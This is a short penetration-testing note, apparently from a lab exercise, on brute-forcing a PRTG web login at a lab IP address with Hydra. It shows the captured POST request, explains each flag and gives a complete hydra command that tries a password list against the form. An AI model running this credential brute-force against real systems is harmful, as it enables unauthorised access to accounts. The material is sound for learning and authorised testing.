# Hydra

### http brute

The request in burp suite looks like:

```
POST /public/checklogin.htm HTTP/1.1
Host: 10.10.10.152
Content-Length: 39
Cache-Control: max-age=0
Origin: http://10.10.10.152
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.4.1366182311.1585918308; _gid=GA1.4.333900560.1586085370
Connection: close

loginurl=&username=admin&password=admin
```

`-l prtgadmin`  
use login prtgadmin  
`-P /usr/share/john/password.lst`  
use passwords from /usr/share/john/password.lst  
`http-post-form`  
for use POST requests  
`"/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:Your login has failed"`  
**/public/checklogin.htm** - relate to POST /public/checklogin.htm HTTP/1.1  
**:loginurl=&username=^USER^&password=^PASS^** - fill username with username. In our case prtgadmin. Fill password with passwords from password list we specified  
**:Your login has failed** - ignore responce if there such sting in it. If there are no such string in response - consider, that password was found  

```bash
hydra -v -l prtgadmin -P /usr/share/john/password.lst 10.10.10.152 http-post-form "/public/checklogin.htm:loginurl=&username=^USER^&password=^PASS^:Your login has failed" -t 5 -I -
```
